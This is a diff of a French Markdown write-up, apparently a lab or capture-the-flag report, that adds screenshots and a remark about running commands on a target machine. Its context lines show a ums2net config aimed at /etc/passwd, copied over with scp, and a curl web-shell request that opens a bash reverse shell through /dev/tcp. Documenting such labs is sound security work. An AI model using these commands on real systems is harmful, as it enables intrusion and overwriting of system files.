@@ -138,6 +138,14 @@ Nous avons créé une **nouvelle configuration** pour `ums2net` qui redirige les
 ![image7](https://github.com/user-attachments/assets/a2ece629-6572-489a-9bb6-a8975d71e1cf)
 ![image23](https://github.com/user-attachments/assets/14e29689-12c6-4b94-ad2a-3f981a7cc3a1)
 
+On peut constater qu'il a bien était modifié :
+
+![image8](https://github.com/user-attachments/assets/ff5a65b0-a177-409e-a2d2-3694ccc6d7bc)
+
+On peut bien exécuter bien des commandes sur la machine cible :
+
+
+
 ```bash
 echo '5000 of=/etc/passwd bs=4096' > /tmp/config
 scp /tmp/config user@192.168.188.214:/tmp/
@@ -158,6 +166,7 @@ curl "http://192.168.188.214:8080/?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/
 ```
 
 ![image5](https://github.com/user-attachments/assets/ffaa58c5-ad24-4938-a740-ecf05c40652d)
+![image14](https://github.com/user-attachments/assets/daae84d5-5a6a-48da-8ac9-dfd8ecf71877)
 ![image19](https://github.com/user-attachments/assets/0e5dabf4-ff0a-48e1-852a-9b4a625d256f)
 
 
